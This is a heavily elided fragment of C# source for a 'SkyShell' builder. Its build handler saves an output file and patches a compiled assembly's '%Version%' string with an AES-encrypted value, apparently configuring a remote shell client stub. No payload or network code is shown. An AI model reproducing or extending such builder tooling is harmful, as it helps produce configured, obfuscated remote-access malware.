        ...
        private void BtnBuild_Click(object sender, EventArgs e)
        {
            ...
            try
            {
                ...
                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                {
                    ...
                    saveFileDialog1.FileName = "SkyShell";
                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        ...
                        MessageBox.Show("Done!", "SkyShell | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        SaveSettings();
                        this.Close();
                    }
                }
            ...
            {
                MessageBox.Show(ex.Message, "SkyShell | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                asmDef?.Dispose();
                            ...
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    ...
                                    if (method.Body.Instructions[i].Operand.ToString() == "%Version%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("SkyShell ", ""));
